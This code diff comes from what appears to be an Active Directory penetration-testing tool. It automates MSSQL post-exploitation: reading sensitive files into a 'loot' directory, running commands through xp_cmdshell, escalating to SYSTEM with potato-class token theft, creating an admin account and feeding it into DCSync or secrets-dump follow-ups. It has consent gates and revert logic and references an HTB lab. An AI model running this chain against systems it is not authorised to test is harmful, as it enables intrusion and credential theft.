+        phase_label = str(phase_definition.get("label", phase) or phase)
+        if phase in {
+            SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
+            SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
+        }:
+            phase_extensions = get_sensitive_file_extensions(
+                str(phase_definition.get("profile", ""))
+            )
+        else:
+            phase_extensions = get_sensitive_phase_extensions(phase)
+        selected_entries = WindowsFileMappingService.select_entries_by_extensions(
+            entries=entries,
+            extensions=phase_extensions,
+        )
+        phase_root_abs = os.path.join(run_root_abs, phase)
+        loot_dir = os.path.join(phase_root_abs, "loot")
+        os.makedirs(loot_dir, exist_ok=True)
+        print_info(
+            "Running OPENROWSET(BULK) content-read review "
+            f"({mark_sensitive(phase_label, 'text')}) on {marked_host}{_link_label}."
+        )
+
+        def phase_fetcher() -> WindowsArtifactAcquisitionResult:
+            file_targets = [
+                (
+                    entry.full_name,
+                    WindowsFileMappingService.build_local_relative_path(
+                        entry.full_name
+                    ),
+                )
+                for entry in selected_entries
+                if entry.full_name
+            ]
+            return WindowsArtifactAcquisitionService().acquire_files(
+                file_targets=file_targets,
+                download_dir=loot_dir,
+                workspace_type=str(getattr(shell, "type", "") or "").strip().lower()
+                or None,
+                file_fetcher=_bulk_read_fetcher,
+            )
+
+        return (
+            WindowsSensitivePhaseExecutionService()
+            .execute_phase(
+                shell,
+                domain=domain,
+                host=host,
+                username=username,
+                phase=phase,
+                phase_label=phase_label,
+                phase_root_abs=phase_root_abs,
+                loot_dir=loot_dir,
+                selected_entries_count=len(selected_entries),
+                phase_excluded_total=0,
+                fetcher=phase_fetcher,
+                source_share="mssql",
+                source_artifact="mssql OPENROWSET(BULK) content read",
+                transport_label="MSSQL (OPENROWSET BULK)",
+            )
+            .to_dict()
+        )
+
+    for phase in phase_sequence:
+        if phase not in selected_phases:
+            continue
+        results.append(_run_phase(phase))
+
+    return OpenRowsetBulkReadResult(
+        ok=True,
+        reason="",
+        entry_count=len(entries),
+        output_path=output_path,
+        phases_run=tuple(results),
+    )
+
+
+def run_xpcmdshell_system_escalation_followup(
+    shell: MssqlShell,
+    *,
+    domain: str,
+    source_host: str,
+    linked_server: str | None,
+    username: str,
+    password: str,
+    from_label: str,
+    to_label: str,
+    xp_result: XpCmdshellExecResult,
+    summary: dict[str, Any] | None = None,
+) -> None:
+    """Chain a SYSTEM-escalation follow-up after a successful XpCmdshell RCE.
+
+    Post-ex model: **only PROVEN SYSTEM inserts a derived graph edge.** After the
+    attack-path ``XpCmdshell`` step confirms command execution (and keeps
+    ``xp_cmdshell`` ON via ``revert=False``), this drives the already-existing
+    :class:`MssqlSeImpersonateService` (GodPotato / SweetPotato / Token-Theft
+    chain, linked-server aware) to escalate to ``NT AUTHORITY\\SYSTEM`` and mint a
+    temporary admin. On success it records the derived escalation edge, hands the
+    minted credential to the normal credential pipeline (mirrors
+    :func:`run_mssql_takeover`'s pattern -- add_credential drives DCSync on a DC
+    or local secrets-dump follow-ups on a member server) so the SYSTEM proof
+    chains into real value instead of being a dead end, THEN removes the minted
+    account while the SYSTEM session is still alive, and ALWAYS reverts the
+    deferred ``xp_cmdshell`` exactly once.
+
+    Best-effort by contract: it NEVER raises out (the terminal RCE step already
+    succeeded); every path — declined consent, precondition miss, failure, or
+    success — still reverts the deferred ``xp_cmdshell``.
+
+    Args:
+        shell: The MSSQL shell.
+        domain: Authentication domain for the credential.
+        source_host: The SOURCE MSSQL instance the RCE ran on.
+        linked_server: The linked-server name when the RCE ran ``AT [link]``.
+        username: Login / sAMAccountName for the connection.
+        password: Password, NT hash, or ``.ccache`` path.
+        from_label: The edge's source node label (kill-chain provenance).
+        to_label: The edge's target node label (the escalation target).
+        xp_result: The :class:`XpCmdshellExecResult` from the deferred RCE call.
+        summary: The attack-path summary (accepted for parity / future eventing).
+    """
+    del from_label, summary  # accepted for call-site parity; not needed here.
+    try:
+        target_label = to_label or source_host
+
+        # 1) Consent gate (env opt-out / non-interactive money-path / prompt).
+        if not _consent_mssql_system_escalation(shell, target=target_label):
+            print_info(
+                "Skipping the MSSQL SYSTEM escalation follow-up; reverting the "
+                "temporarily-enabled xp_cmdshell."
+            )
+            revert_deferred_xp_cmdshell(
+                shell,
+                domain=domain,
+                host=source_host,
+                username=username,
+                password=password,
+                xp_result=xp_result,
+            )
+            return
+
+        # 2) Resolve the escalation target (DC02 in the linked-server chain).
+        target_host, target_ip, target_fqdn, is_dc, target_domain = (
+            _resolve_linked_escalation_target(
+                shell, domain=domain, to_label=to_label, linked_server=linked_server
+            )
+        )
+        # target_ip/target_fqdn are no longer needed for edge recording — the
+        # derived escalation edge now self-loops on target_label (see step 6
+        # below), matching the XpCmdshell self-loop's from/to labels exactly.
+        del target_ip, target_fqdn
+
+        # 3) Build the backend the SAME way execute_xp_cmdshell_on_instance does.
+        from adscan_internal.models.domain import (  # noqa: PLC0415
+            resolve_dc_ip,
+            resolve_dc_reachability,
+        )
+        from adscan_internal.services.mssql_auth import (  # noqa: PLC0415
+            resolve_mssql_ntlm_fallback_secret,
+        )
+        from adscan_internal.services.exploitation.mssql_seimpersonate import (  # noqa: PLC0415
+            MssqlSeImpersonateService,
+        )
+
+        kdc_host = resolve_dc_ip(
+            (getattr(shell, "domains_data", None) or {}).get(domain) or {}
+        )
+        ntlm_fallback_secret = resolve_mssql_ntlm_fallback_secret(
+            shell,
+            domain=domain,
+            username=username,
+            wire_secret=password,
+            password=password,
+        )
+        backend = ImpacketMSSQLBackend(
+            host=source_host,
+            domain=domain,
+            kdc_host=kdc_host,
+            ntlm_fallback_secret=ntlm_fallback_secret,
+        )
+
+        # 4) Minted admin identity (recognizable, policy-compliant).
+        admin_user, admin_pw = _default_minted_identity(
+            shell, domain=domain, username=username, password=password
+        )
+
+        # 5) Drive the existing escalation service (linked-server aware).
+        svc = MssqlSeImpersonateService(
+            backend=backend,
+            domain=domain,
+            username=username,
+            password=password,
+            host=source_host,
+            linked_server=linked_server,
+            target_host=target_host,
+            is_dc=is_dc,
+            shell=shell,
+        )
+        if not svc.can_exploit():
+            print_info_debug(
+                "MSSQL SYSTEM escalation follow-up: preconditions not met "
+                "(SeImpersonate/CLR unavailable); skipping."
+            )
+            return
+
+        session = svc.session()
+        try:
+            if not session.setup():
+                print_info_debug(
+                    "MSSQL SYSTEM escalation follow-up: CLR setup failed; skipping."
+                )
+                return
+            result = session.execute_admin_user(admin_user, admin_pw, create_user=True)
+            if not result.success:
+                marked_target = mark_sensitive(target_label, "hostname")
+                print_warning(
+                    "MSSQL SYSTEM escalation follow-up did not reach SYSTEM on "
+                    f"{marked_target}"
+                    + (f": {result.error_message}." if result.error_message else ".")
+                )
+                return
+
+            # 6) PROVEN SYSTEM → record the derived escalation edge.
+            relation = (
+                "MssqlTokenTheftEscalation"
+                if result.technique == "token_theft_chain"
+                else "MssqlSeImpersonateEscalation"
+            )
+            try:
+                # Self-loop on the COMPUTER that already has the RCE (the same
+                # host XpCmdshell just ran on), NOT the raw executing user
+                # three hops upstream. Mirrors exactly how the XpCmdshell
+                # self-loop edge itself gets recorded (attack_path_execution.py
+                # -> update_edge_status_by_labels, same from/to label) so this
+                # follow-up chains onto that edge instead of appearing as a
+                # standalone JOHN.W -> MssqlTokenTheftEscalation -> dc02 path
+                # disconnected from the SQLAccess/MssqlLinkedServerLateral/
+                # XpCmdshell chain that unlocked it.
+                from adscan_internal.services.attack_graph_service import (  # noqa: PLC0415
+                    update_edge_status_by_labels,
+                )
+
+                update_edge_status_by_labels(
+                    shell,
+                    domain,
+                    from_label=target_label,
+                    relation=relation,
+                    to_label=target_label,
+                    status="success",
+                    notes={
+                        "technique": "mssql_" + result.technique,
+                        "escalated_via_linked_server": linked_server or "",
+                        "execution_identity": xp_result.execution_identity,
+                        "final_identity": "NT AUTHORITY\\SYSTEM",
+                        "membership_confirmed": result.membership_confirmed,
+                        "username": username,
+                        "target": target_label,
+                    },
+                )
+            except Exception as edge_exc:  # noqa: BLE001
+                telemetry.capture_exception(edge_exc)
+                print_exception(exception=edge_exc)
+
+            print_success(
+                "MSSQL SYSTEM escalation follow-up reached NT AUTHORITY\\SYSTEM on "
+                f"{mark_sensitive(target_label, 'hostname')} via {result.technique}."
+            )
+
+            # 7) Hand the minted credential to the NORMAL credential pipeline
+            # (mirrors run_mssql_takeover's pattern) so proving SYSTEM actually
+            # chains into value instead of being a dead end: add_credential
+            # stores it and runs the right follow-ups itself --
+            #   DC     -> host=None => DOMAIN credential; the pipeline detects
+            #             Domain-Admin status and drives DCSync / flag collection.
+            #   Member -> host=target_host => LOCAL credential; the pipeline
+            #             decides the appropriate local secrets-dump follow-ups.
+            # Only hand off when membership_confirmed -- an unverified group add
+            # must never be trusted downstream as a privileged credential.
+            #
+            # target_domain (from step 2) may differ from the AUTH domain -- the
+            # classic cross-forest linked-server chain (darkzero.htb DC01 ->
+            # darkzero.ext DC02). Verifying against `domain` there sends the
+            # AS-REQ to the WRONG KDC and the credential never resolves (2026-07-21
+            # HTB DarkZero live bug). Resolve the credential's OWN domain's PDC IP
+            # instead of reusing the auth domain's kdc_host.
+            if result.membership_confirmed:
+                try:
+                    if target_domain != domain:
+                        target_domain_record = (
+                            getattr(shell, "domains_data", None) or {}
+                        ).get(target_domain) or {}
+                        target_pdc_ip = resolve_dc_ip(target_domain_record)
+                        target_dc_reachable = resolve_dc_reachability(
+                            target_domain_record
+                        )
+
+                        # Before blindly trusting this cross-domain credential,
+                        # check whether the xp_cmdshell RCE we just proved opens
+                        # a REAL route to target_domain's DC that ADscan didn't
+                        # have from the original vantage (e.g. a cross-forest
+                        # linked-server chain landing on a DC that itself sits
+                        # on the trust-partner's internal segment). Gated on
+                        # the operator's scan-config pivoting opt-in; a pivot
+                        # failure/no-candidates degrades to today's
+                        # skip_live_verification fallback below, unchanged.
+                        if target_dc_reachable is False and is_pivoting_enabled(
+                            shell
+                        ):
+                            try:
+                                maybe_pivot_after_xpcmdshell_success(
+                                    shell,
+                                    domain=domain,
+                                    host=source_host,
+                                    username=username,
+                                    password=password,
+                                    linked_server=linked_server,
+                                    identity=xp_result.execution_identity,
+                                )
+                                # The pivot may have re-enumerated trusts and
+                                # refreshed connectivity in domains_data --
+                                # re-read fresh rather than trusting the
+                                # pre-pivot snapshot above.
+                                target_domain_record = (
+                                    getattr(shell, "domains_data", None) or {}
+                                ).get(target_domain) or {}
+                                target_pdc_ip = (
+                                    resolve_dc_ip(target_domain_record)
+                                    or target_pdc_ip
+                                )
+                                target_dc_reachable = resolve_dc_reachability(
+                                    target_domain_record
+                                )
+                            except Exception as pivot_exc:  # noqa: BLE001
+                                # Never let a pivot attempt block or crash the
+                                # follow-up -- degrade to the existing
+                                # skip_live_verification fallback below.
+                                telemetry.capture_exception(pivot_exc)
+                                print_exception(exception=pivot_exc)
+                    else:
+                        target_pdc_ip = kdc_host
+                        target_dc_reachable = True
+
+                    # The target domain's own DC is confirmed unreachable from the
+                    # current vantage (cross-domain connectivity precheck run
+                    # during trust enumeration) -- a live Kerberos/LDAP
+                    # verification against it would always fail on network
+                    # grounds, not on credential validity. SYSTEM + admin-group
+                    # membership were already proven over the linked-server SQL
+                    # channel itself, so trust that proof instead of forcing a
+                    # verification attempt that cannot succeed and would
+                    # otherwise misfire the USER_NOT_FOUND credential-recovery /
+                    # spray-fallback flow.
+                    skip_live_verification = (
+                        target_domain != domain and target_dc_reachable is False
+                    )
+                    if skip_live_verification:
+                        print_info_debug(
+                            "MSSQL SYSTEM escalation follow-up: "
+                            f"{mark_sensitive(target_domain, 'domain')} is "
+                            "unreachable from the current vantage; trusting the "
+                            "credential without live re-verification (SYSTEM and "
+                            "admin-group membership were already proven over the "
+                            "linked-server SQL channel)."
+                        )
+
+                    shell.add_credential(
+                        target_domain,
+                        admin_user,
+                        admin_pw,
+                        host=None if is_dc else target_host,
+                        pdc_ip=target_pdc_ip or None,
+                        prompt_for_user_privs_after=True,
+                        credential_origin="mssql_seimpersonate",
+                        trusted_manual_validation=skip_live_verification,
+                    )
+                except Exception as cred_exc:  # noqa: BLE001
+                    telemetry.capture_exception(cred_exc)
+                    print_exception(exception=cred_exc)
+            else:
+                print_info_debug(
+                    "MSSQL SYSTEM escalation follow-up: group membership not "
+                    "confirmed; skipping credential handoff."
+                )
+
+            # 8) Remove the minted account AFTER the credential pipeline has
+            # consumed it, while the SYSTEM session is still alive.
+            try:
+                session.revert_admin_user(admin_user)
+            except Exception as revert_exc:  # noqa: BLE001
+                telemetry.capture_exception(revert_exc)
+                print_exception(exception=revert_exc)
+        finally:
+            try:
+                session.teardown()
+            except Exception as teardown_exc:  # noqa: BLE001
+                telemetry.capture_exception(teardown_exc)
+                print_exception(exception=teardown_exc)
+    except Exception as exc:  # noqa: BLE001 - follow-up must never crash the step
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        print_warning(f"MSSQL SYSTEM escalation follow-up raised: {exc}.")
+    finally:
+        # 9) ALWAYS revert the deferred xp_cmdshell exactly once.
+        revert_deferred_xp_cmdshell(
+            shell,
+            domain=domain,
+            host=source_host,
+            username=username,
+            password=password,
+            xp_result=xp_result,
+        )
 
 
 def run_mssql_postauth_workflow(
@@ -1965,7 +4059,28 @@ def run_mssql_postauth_workflow(
     _kdc_host = resolve_dc_ip(
         (getattr(shell, "domains_data", None) or {}).get(domain) or {}
     )
-    backend = ImpacketMSSQLBackend(host=host, domain=domain, kdc_host=_kdc_host)
+    # Kerberos-first, posture-aware NTLM fallback (SSOT). When ``password`` is a
+    # ``.ccache`` and the SQL instance has no ``MSSQLSvc`` SPN, Kerberos fails
+    # (``KDC_ERR_S_PRINCIPAL_UNKNOWN``); the sticky fallback lets the whole
+    # workflow self-heal over NTLM. Returns ``None`` (no-op) for a plain
+    # password / NT hash or when NTLM is known-blocked by posture.
+    from adscan_internal.services.mssql_auth import (
+        resolve_mssql_ntlm_fallback_secret,
+    )
+
+    _ntlm_fallback_secret = resolve_mssql_ntlm_fallback_secret(
+        shell,
+        domain=domain,
+        username=username,
+        wire_secret=password,
+        password=password,
+    )
+    backend = ImpacketMSSQLBackend(
+        host=host,
+        domain=domain,
+        kdc_host=_kdc_host,
+        ntlm_fallback_secret=_ntlm_fallback_secret,
+    )
     sweep = backend.sweep_privileges(
         domain=domain,
         username=username,
@@ -1981,9 +4096,7 @@ def run_mssql_postauth_workflow(
             "error": "auth_not_confirmed",
         }
 
-    print_success(
-        f"[bold]Login confirmed[/bold]  {marked_user} @ {marked_host}"
-    )
+    print_success(f"[bold]Login confirmed[/bold]  {marked_user} @ {marked_host}")
     print_mssql_sweep_card(sweep)
 
     execution_path: MssqlExecutionPath | None = None
@@ -2036,74 +4149,59 @@ def run_mssql_postauth_workflow(
     xp_enabled = sweep.xp_cmdshell == XpCmdshellStatus.ENABLED
     enabled_by_us = False
     original_advanced_on = False
+    # ID of the ledger record for the LOCAL enable (None until we register it).
+    local_change_id: str | None = None
+    # (linked_server_name, ledger_change_id | None) for every linked server we
+    # enabled xp_cmdshell on — tracked so EACH is reverted at exit, not just the
+    # one that yielded a usable path.
+    linked_enabled: list[tuple[str, str | None]] = []
 
     if not xp_enabled:
-        # Capture the pre-enable advanced-options state so a later revert can
-        # restore it exactly (a box that already had advanced options on must be
-        # left that way). Best-effort: an unreadable state defaults to off.
-        try:
-            _, original_advanced_on = backend._read_xp_cmdshell_state(
-                domain=domain,
-                username=username,
-                secret=password,
-                timeout=30,
-            )
-        except Exception as exc:  # noqa: BLE001 - state read is best-effort
-            telemetry.capture_exception(exc)
-            original_advanced_on = False
-
-        print_info_debug(
-            f"xp_cmdshell is disabled on {marked_host}; attempting to enable it "
-            f"as {marked_user} (succeeds for sysadmin / serveradmin / ALTER SETTINGS)."
-        )
-        enable_result = backend.enable_xp_cmdshell(
+        # The option is off, so enabling it is an ACTUAL configuration change:
+        # consent + ledger-register + enable are done ONCE in the shared SSOT
+        # helper (also used by the attack-step primitive). The revert closure
+        # below reads the outcome fields to restore exactly what WE changed.
+        _local_enable = _ensure_xp_cmdshell_enabled_local(
+            shell,
+            backend,
             domain=domain,
+            host=host,
             username=username,
             secret=password,
-            timeout=60,
+            marked_host=marked_host,
+            marked_user=marked_user,
+            currently_enabled=False,
         )
-        if enable_result.success:
-            xp_enabled = True
-            enabled_by_us = True
-            print_info_debug(
-                f"xp_cmdshell enable attempt succeeded on {marked_host}."
-            )
-            print_warning(
-                f"[bold]xp_cmdshell enabled[/bold] on {marked_host} "
-                "(SQL Server configuration modified - revert after engagement)."
-            )
-        else:
-            # Lacking ALTER SETTINGS is the common, expected outcome for a
-            # low-priv login — log at debug, do not treat as fatal.
-            reason = parse_xp_cmdshell_enable_failure_reason(
-                enable_result.stderr or enable_result.stdout or ""
-            )
-            if reason:
-                print_info_debug(
-                    "xp_cmdshell enable attempt failed on "
-                    f"{marked_host}: {mark_sensitive(reason, 'detail')}."
-                )
-            else:
-                print_info_debug(
-                    f"xp_cmdshell enable attempt was not confirmed on {marked_host}."
-                )
+        xp_enabled = _local_enable.xp_enabled
+        enabled_by_us = _local_enable.enabled_by_us
+        original_advanced_on = _local_enable.original_advanced_on
+        local_change_id = _local_enable.local_change_id
 
-    def _revert_xp_cmdshell_if_we_enabled() -> None:
-        """Restore xp_cmdshell to its pre-engagement state if WE enabled it.
+    def _revert_local_xp_cmdshell() -> None:
+        """Restore the LOCAL xp_cmdshell to its pre-engagement state if WE enabled it.
 
-        ADscan must always leave the SQL Server configuration as it was found.
-        This runs on EVERY workflow exit — including the usable/success path
-        where xp_cmdshell was enabled and used — not only when the enable turned
-        out unusable. Idempotent: a no-op when we did not enable it (or already
-        reverted), so it is safe to call from multiple exit points.
+        Drives the ledger record through the verify-the-undo flow: disable, then
+        a re-read confirms the option is actually off before the record reaches
+        the good terminal state. A failed/unconfirmed revert routes to
+        ``manual_required`` so the client always gets a checklist. Idempotent: a
+        no-op once reverted (``enabled_by_us`` cleared).
         """
-        nonlocal enabled_by_us
+        nonlocal enabled_by_us, local_change_id
         if not enabled_by_us:
             return
+        ledger = _get_env_change_ledger(shell)
+        change_id = local_change_id
+        if ledger is not None and change_id:
+            try:
+                ledger.mark_revert_in_progress(change_id)
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+                print_exception(exception=exc)
         print_info_debug(
             f"Reverting xp_cmdshell on {marked_host} to its pre-engagement state "
             "(ADscan enabled it; restoring the original configuration)."
         )
+        reverted = False
         try:
             revert_result = backend.disable_xp_cmdshell(
                 domain=domain,
@@ -2112,20 +4210,136 @@ def run_mssql_postauth_workflow(
                 restore_advanced_options=original_advanced_on,
                 timeout=60,
             )
-            if getattr(revert_result, "success", False):
-                print_info_debug(
-                    f"xp_cmdshell reverted to disabled on {marked_host}."
-                )
-            else:
-                print_warning(
-                    f"xp_cmdshell revert was NOT confirmed on {marked_host} — "
-                    "verify the SQL Server configuration manually."
-                )
+            reverted = bool(getattr(revert_result, "success", False))
         except Exception as exc:  # noqa: BLE001 - revert is best-effort hygiene
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_warning(f"xp_cmdshell revert raised on {marked_host}: {exc}.")
-        finally:
-            enabled_by_us = False
+            reverted = False
+
+        verified = False
+        if reverted:
+            try:
+                post_state, _ = backend._read_xp_cmdshell_state(
+                    domain=domain,
+                    username=username,
+                    secret=password,
+                    timeout=30,
+                )
+                verified = post_state != XpCmdshellStatus.ENABLED
+            except Exception as exc:  # noqa: BLE001 - verify re-read is best-effort
+                telemetry.capture_exception(exc)
+                print_exception(exception=exc)
+                verified = False
+
+        if reverted and verified:
+            print_info_debug(f"xp_cmdshell reverted to disabled on {marked_host}.")
+            if ledger is not None and change_id:
+                try:
+                    ledger.mark_reverted_confirmed(
+                        change_id,
+                        verification_method="xp_cmdshell_state_reread",
+                        min_credential_principal=username,
+                    )
+                except Exception as exc:  # noqa: BLE001
+                    telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
+        else:
+            print_warning(
+                f"xp_cmdshell revert was NOT confirmed on {marked_host} — "
+                "verify the SQL Server configuration manually."
+            )
+            _route_xp_cmdshell_revert_failure(
+                ledger,
+                change_id or "",
+                host=host,
+                linked_server=None,
+                error="xp_cmdshell disable/verify not confirmed",
+            )
+        enabled_by_us = False
+        local_change_id = None
+
+    def _revert_linked_xp_cmdshell() -> None:
+        """Disable xp_cmdshell on every linked server WE enabled it on.
+
+        Uses the previously-unused
+        :func:`queries.disable_xp_cmdshell_on_link` (``EXEC(...) AT [link]``)
+        via the backend's generic ``execute_query`` so the linked-server change
+        is no longer left ON after the engagement. Each ledger record is driven
+        to a confirmed / manual-required terminal state. Idempotent: drains the
+        tracked list.
+        """
+        if not linked_enabled:
+            return
+        ledger = _get_env_change_ledger(shell)
+        pending = list(linked_enabled)
+        linked_enabled.clear()
+        for linked_name, change_id in pending:
+            marked_link = mark_sensitive(linked_name, "hostname")
+            if ledger is not None and change_id:
+                try:
+                    ledger.mark_revert_in_progress(change_id)
+                except Exception as exc:  # noqa: BLE001
+                    telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
+            print_info_debug(
+                f"Reverting linked-server xp_cmdshell on {marked_link} "
+                f"(enabled via {marked_host})."
+            )
+            reverted = False
+            try:
+                revert_result = backend.execute_query(
+                    domain=domain,
+                    username=username,
+                    secret=password,
+                    query=mssql_queries.disable_xp_cmdshell_on_link(linked_name),
+                    timeout=60,
+                )
+                reverted = bool(getattr(revert_result, "success", False))
+            except Exception as exc:  # noqa: BLE001 - revert is best-effort hygiene
+                telemetry.capture_exception(exc)
+                print_exception(exception=exc)
+                print_warning(
+                    f"Linked-server xp_cmdshell revert raised on {marked_link}: {exc}."
+                )
+                reverted = False
+
+            if reverted:
+                print_info_debug(
+                    f"Linked-server xp_cmdshell reverted to disabled on {marked_link}."
+                )
+                if ledger is not None and change_id:
+                    try:
+                        ledger.mark_reverted_confirmed(
+                            change_id,
+                            verification_method="xp_cmdshell_disable_on_link",
+                            min_credential_principal=username,
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                        print_exception(exception=exc)
+            else:
+                print_warning(
+                    f"Linked-server xp_cmdshell revert was NOT confirmed on "
+                    f"{marked_link} — verify the SQL Server configuration manually."
+                )
+                _route_xp_cmdshell_revert_failure(
+                    ledger,
+                    change_id or "",
+                    host=host,
+                    linked_server=linked_name,
+                    error="linked-server xp_cmdshell disable not confirmed",
+                )
+
+    def _revert_xp_cmdshell_if_we_enabled() -> None:
+        """Single revert entry point for EVERY xp_cmdshell change we made.
+
+        Reverts the local enable AND all linked-server enables through the one
+        ledger-backed path, so there is no competing best-effort revert. Safe to
+        call from multiple exit points — each half is idempotent.
+        """
+        _revert_local_xp_cmdshell()
+        _revert_linked_xp_cmdshell()
 
     # Ground-truth usability: sysadmin is always usable when enabled; otherwise
     # probe by running a benign command (single probe).
@@ -2184,22 +4398,24 @@ def run_mssql_postauth_workflow(
         )
         for linked in sweep.linked_servers:
             marked_link = mark_sensitive(linked.name, "hostname")
-            print_info(
-                f"Attempting linked-server xp_cmdshell enablement on {marked_link}."
-            )
-            link_enable = backend.enable_xp_cmdshell(
+            # Enabling xp_cmdshell on a linked server is ALSO a configuration
+            # change on a client system — consent + ledger-register + enable are
+            # done ONCE in the shared SSOT helper (also used by the attack-step
+            # primitive), so each enabled link is reverted at scan end.
+            _link_enable = _ensure_xp_cmdshell_enabled_linked(
+                shell,
+                backend,
                 domain=domain,
+                host=host,
+                linked_server=linked.name,
                 username=username,
                 secret=password,
-                linked_server=linked.name,
-                timeout=60,
             )
-            if not link_enable.success:
-                print_warning(
-                    "Linked-server xp_cmdshell enablement was not confirmed on "
-                    f"{marked_link}."
-                )
+            if _link_enable.declined or not _link_enable.enabled:
                 continue
+            # Track the successful enable so EVERY enabled link is reverted at
+            # exit, not just the one that yields a usable path.
+            linked_enabled.append((linked.name, _link_enable.change_id))
             print_success(
                 f"xp_cmdshell enabled successfully on linked server {marked_link}."
             )
@@ -2232,20 +4448,30 @@ def run_mssql_postauth_workflow(
             break
 
     if execution_path is None:
-        print_warning(
-            "No MSSQL command-execution path was established. Falling back to impersonation checks only."
+        # No local AND no linked xp_cmdshell path: there is NO command-execution
+        # surface at all. run_mssql_check_impersonate() drives `whoami /priv`
+        # THROUGH xp_cmdshell — calling it here would be a guaranteed-fail
+        # round-trip ("EXECUTE permission denied"), not a real privilege check.
+        # Skip it honestly and fall through to the low-privilege filesystem
+        # review, which needs no command execution at all (xp_dirtree).
+        print_info(
+            f"No command-execution surface on {marked_host}; privilege check not "
+            "applicable from the DB layer. Falling back to a low-privilege "
+            "filesystem review."
         )
-        run_mssql_check_impersonate(
+        _revert_xp_cmdshell_if_we_enabled()
+        review_result = _run_mssql_low_privilege_file_review(
             shell,
+            backend,
             domain=domain,
             host=host,
             username=username,
             password=password,
         )
-        _revert_xp_cmdshell_if_we_enabled()
         return {
             "completed": True,
             "execution_available": False,
+            "low_privilege_file_review": review_result,
         }
 
     if execution_path.identity:
@@ -2346,6 +4572,7 @@ def run_mssql_check_impersonate(
             kdc_host = resolve_dc_ip(domains_data.get(domain) or {})
     except Exception as posture_exc:
         telemetry.capture_exception(posture_exc)
+        print_exception(exception=posture_exc)
 
     result = service.mssql.check_seimpersonate(
         host=host,
@@ -2365,6 +4592,7 @@ def run_mssql_check_impersonate(
         telemetry.capture("mssql_seimpersonate_checked", properties)
     except Exception as e:  # pragma: no cover
         telemetry.capture_exception(e)
+        print_exception(exception=e)
 
     if result.has_privilege:
         _seimpers_body = RichText.assemble(
@@ -2376,8 +4604,14 @@ def run_mssql_check_impersonate(
             (" on ", _COLOR_MUTED),
             (mark_sensitive(host, "hostname"), f"bold {_COLOR_STEEL}"),
             ("\n\n", ""),
-            ("This account can impersonate SYSTEM via a potato-class exploit.\n", _COLOR_MUTED),
-            ("Next: run the takeover to escalate to SYSTEM-equivalent access.", _COLOR_MUTED),
+            (
+                "This account can impersonate SYSTEM via a potato-class exploit.\n",
+                _COLOR_MUTED,
+            ),
+            (
+                "Next: run the takeover to escalate to SYSTEM-equivalent access.",
+                _COLOR_MUTED,
+            ),
         )
         print_panel(
             _seimpers_body,
@@ -2393,8 +4627,7 @@ def run_mssql_check_impersonate(
         return bool(escalated)
 
     print_warning(
-        f"SeImpersonatePrivilege not detected on {marked_host} "
-        f"for {marked_username}."
+        f"SeImpersonatePrivilege not detected on {marked_host} for {marked_username}."
     )
     return False
 
@@ -2511,6 +4744,7 @@ def _delete_minted_account_via_remote_exec(
         )
     except ValueError as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_info_debug(
             f"[mssql][revert] remote-exec config build failed for {marked}: {exc}"
         )
@@ -2532,6 +4766,7 @@ def _delete_minted_account_via_remote_exec(
         return bool(run_async_sync(_run()))
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_info_debug(
             f"[mssql][revert] remote-exec delete of {marked} on {marked_host} failed: {exc}"
         )
@@ -2599,6 +4834,7 @@ def _auto_revert_minted_account(
                     ledger.mark_reverted(change_id)
                 except Exception as exc:  # noqa: BLE001
                     telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
             return
         print_info(
             f"Revert: removing {marked} from Domain Admins in {marked_domain} "
@@ -2624,6 +4860,7 @@ def _auto_revert_minted_account(
             removed = bool(getattr(result, "success", False))
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
         if removed:
             print_success(
                 f"{marked} removed from Domain Admins — prior state restored."
@@ -2633,6 +4870,7 @@ def _auto_revert_minted_account(
                     ledger.mark_reverted(change_id)
                 except Exception as exc:  # noqa: BLE001
                     telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
             return
         print_warning(
             f"Auto-revert could NOT confirm removal of {marked} from Domain Admins "
@@ -2651,6 +4889,7 @@ def _auto_revert_minted_account(
                 )
             except Exception as exc:  # noqa: BLE001
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
         return
 
     # ── Created-account path — credential-driven delete (no MSSQL/xp_cmdshell) ─
@@ -2659,9 +4898,7 @@ def _auto_revert_minted_account(
     # through its OWN privileged credential: native LDAP on a DC, native
     # remote-exec on a member server.
     _ = backend  # retained for signature/call-site compatibility; no longer used
-    print_info(
-        f"Auto-revert: removing the minted account {marked} on {marked_host}..."
-    )
+    print_info(f"Auto-revert: removing the minted account {marked} on {marked_host}...")
     ok = False
     is_domain_scope = str(scope or "").strip().lower() == "domain"
     if is_domain_scope:
@@ -2717,6 +4954,7 @@ def _auto_revert_minted_account(
                 ledger.mark_reverted(change_id)
             except Exception as exc:  # noqa: BLE001
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
         return
     print_warning(
         f"Auto-revert could NOT confirm deletion of {marked} on {marked_host}. "
@@ -2736,6 +4974,7 @@ def _auto_revert_minted_account(
             )
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
 
 
 def _default_minted_identity(
@@ -2839,13 +5078,17 @@ def _select_takeover_da_target(
         if sel_idx == len(sel_options) - 2:
             from adscan_core.output import prompt_ask  # noqa: PLC0415
 
-            selected_user = (prompt_ask("Existing domain username", default="") or "").strip()
+            selected_user = (
+                prompt_ask("Existing domain username", default="") or ""
+            ).strip()
         else:
             selected_user = sel_options[sel_idx]
     else:
         from adscan_core.output import prompt_ask  # noqa: PLC0415
 
-        selected_user = (prompt_ask("Existing domain username", default="") or "").strip()
+        selected_user = (
+            prompt_ask("Existing domain username", default="") or ""
+        ).strip()
 
     if not selected_user:
         print_warning("No existing user selected — cancelling takeover.")
@@ -2854,7 +5097,7 @@ def _select_takeover_da_target(
